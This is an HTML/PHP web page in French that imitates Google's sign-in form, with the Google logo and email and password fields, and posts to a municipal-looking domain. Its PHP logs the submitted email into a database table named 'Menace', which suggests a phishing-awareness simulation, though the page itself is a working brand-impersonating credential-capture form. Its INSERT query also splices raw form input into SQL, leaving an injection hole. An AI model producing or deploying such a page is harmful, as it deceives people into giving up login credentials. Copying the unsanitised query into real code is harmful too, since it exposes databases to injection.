<!DOCTYPE html>
<html>
    <head>
        <title>Connexion : compte Google</title>
        <link rel="shortcut icon" href="logo.png" type="image/png">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
        <div class="container">
            <form action="http://authentification.ville-soissons.fr/url/Web/Info.php" method="POST">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Logo de Google">
                <div class="title_text">
                    <label> Connexion</label>
                </div>
                <div class="input-group">
                    <label for="input_mail">Adresse e-mail ou numéro de téléphone</label>
                    <input type="text" id="input_mail" name="input_mail" required required placeholder="Identifiant">
                </div>
                <div class="input-group">
                    <label for="input_mdp">Mot de passe</label>
                    <input type="password" id="input_mdp" name="input_mdp" required placeholder="Mot de passe">
                </div>
                <div class="input-group">
                    <input type="submit" name="submit" value="Se connecter">
                </div>
                <div class="remember-me">
                    <input type="checkbox" id="remember_me" name="remember_me">
                    <label for="remember_me">Rester connecté</label>
                </div>
                <div class="forgot-password">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
            </form>
        </div>
        <?php
            if (isset($_POST['submit'])) {
                $servername = ""; #! Mettre le nom de domaine du serveur
                $username = ""; #! Mettre l'identifiant pour se conencter à la BDD
                $password = ""; #! Mettre le MDP pour se connecter à la BDD
                $dbname = ""; #! Mettre le nom de la BDD
        
                // Création de la connexion
                $conn = new mysqli($servername, $username, $password, $dbname);
        
                // Vérification de la connexion
                if ($conn->connect_error) {
                    die("Connection failed: " . $conn->connect_error);
                }
        
                // Préparation et exécution de la requête SQL pour récupérer la valeur maximale de "id"
                $sql_max_id = "SELECT MAX(id) AS max_id FROM Menace";
                $result_max_id = $conn->query($sql_max_id);
                $row_max_id = $result_max_id->fetch_assoc();
                $new_id = $row_max_id['max_id'] + 1;
                $date = date("Y-m-d");

                // Préparation et exécution de la requête SQL pour insérer une nouvelle menace dans la table "Menace"
                $sql = "INSERT INTO Menace (id, agent, date_detection) VALUES ($new_id, '".$_POST['input_mail']."', '$date')";

                if ($conn->query($sql) === TRUE) {
                    echo '';
                } else {
                    echo "Erreur : " . $conn->error;
                }
        
                // Fermeture de la connexion
                $conn->close();

            }
        ?>
    </body>
</html>